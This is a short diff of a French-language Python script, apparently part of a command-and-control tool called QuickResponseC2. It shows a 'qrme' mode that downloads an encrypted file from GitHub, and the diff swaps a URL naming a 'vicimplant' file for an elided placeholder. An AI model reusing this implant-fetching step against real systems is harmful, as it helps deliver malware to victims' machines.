@@ -109,8 +109,8 @@ def main():
     afficher_titre()
 
     if questionary.confirm("Lancer le mode qrme ? (QR+AES)").ask():
-        url = "https://github.com/tucommenceapousser/QuickResponseC2/raw/refs/heads/trkn/vicimplant%20(1).enc"
-        filepath = "vicimplant.enc"
+        url = "https://github.com/tucommenceapousser/QuickResponseC2/raw/refs/heads/main/...enc"
+        filepath = "...enc"
 
         # Vérifier si le fichier existe déjà pour éviter un re-téléchargement inutile
         if os.path.exists(filepath):
